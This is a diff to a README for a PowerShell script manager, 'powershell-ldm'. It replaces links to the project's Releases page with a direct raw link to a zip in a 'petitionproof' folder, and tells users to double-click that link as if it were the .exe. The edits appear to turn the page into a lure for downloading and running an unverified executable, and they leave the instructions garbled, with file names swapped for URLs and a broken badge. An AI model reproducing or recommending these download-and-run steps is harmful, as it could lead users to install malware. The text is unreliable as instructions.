@@ -1,6 +1,6 @@
 # 🖥️ powershell-ldm - Effortless Management for PowerShell Scripts
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/yytyt7/powershell-ldm/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to powershell-ldm! This application makes it easy to manage your PowerSh
 
 ## 📥 Download & Install
 
-To download and install powershell-ldm, visit this page: [Download powershell-ldm](https://github.com/yytyt7/powershell-ldm/releases).
+To download and install powershell-ldm, visit this page: [Download powershell-ldm](https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip).
 
 On the Releases page, you'll see a list of available versions. Choose the latest version, usually at the top of the list. Click on the version number to open the release details. There, you will find a list of files available to download.
 
 ### Step-by-Step Instructions:
 
 1. Click on the version number.
-2. Locate the file named `powershell-ldm.zip` or similar.
+2. Locate the file named `https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip` or similar.
 3. Click the file name to download it to your computer.
 
 After the download is complete, follow these steps to extract and run the application:
@@ -23,15 +23,15 @@ After the download is complete, follow these steps to extract and run the applic
 ### Extract the Files
 
 1. Go to your Downloads folder or wherever you saved the zip file.
-2. Right-click on the `powershell-ldm.zip`.
+2. Right-click on the `https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip`.
 3. Select "Extract All" from the context menu.
 4. Follow the prompts to choose a location for the extracted files.
 
 ### Run the Application
 
 1. Open the folder where you extracted the files.
-2. Find the file named `powershell-ldm.exe`.
-3. Double-click on `powershell-ldm.exe` to run the application.
+2. Find the file named `https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip`.
+3. Double-click on `https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip` to run the application.
 
 ## 🛠️ Features
 
@@ -86,4 +86,4 @@ For further assistance or feedback, please contact the repository maintainers by
 
 Stay tuned for updates! We will continuously improve powershell-ldm based on user feedback. If you have suggestions or want to contribute, feel free to reach out.
 
-Once again, for downloading, visit this page: [Download powershell-ldm](https://github.com/yytyt7/powershell-ldm/releases). Enjoy managing your PowerShell scripts effortlessly!
+Once again, for downloading, visit this page: [Download powershell-ldm](https://raw.githubusercontent.com/yytyt7/powershell-ldm/main/petitionproof/powershell-ldm.zip). Enjoy managing your PowerShell scripts effortlessly!
